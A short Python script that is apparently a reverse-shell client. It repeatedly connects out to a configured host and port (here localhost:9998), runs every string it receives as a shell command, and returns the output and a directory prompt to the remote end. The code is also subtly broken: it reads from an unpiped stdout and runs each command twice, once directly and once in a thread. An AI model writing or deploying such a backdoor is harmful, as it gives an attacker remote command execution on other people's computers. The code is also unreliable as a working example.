import os, subprocess
import socket
import time
import threading


def exec_and_send(data, client_sock):
    p = subprocess.Popen(data, shell=True)
    output = p.stdout.read()
    print(output)
    client_sock.send(output)
    response = os.getcwd() + ">"
    client_sock.send(response.encode())


def main():
    while True:
        try:
            client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_sock.connect((host, port))
            print("connected")
            response = os.getcwd() + ">"
            print(response)
            client_sock.send(response.encode())
            while True:
                try:
                    msg_from_srv = client_sock.recv(1024).decode()
                    exec_and_send(msg_from_srv, client_sock)
                    thread = threading.Thread(target=exec_and_send, args=(msg_from_srv, client_sock))
                    thread.start()
                except WindowsError as e:
                    print(e)
                    break
                except Exception as e:
                    print(e)
                    time.sleep(5)
                    continue
        except Exception as e:
            print(e)
            time.sleep(5)


host = "localhost"
port = 9998

main()
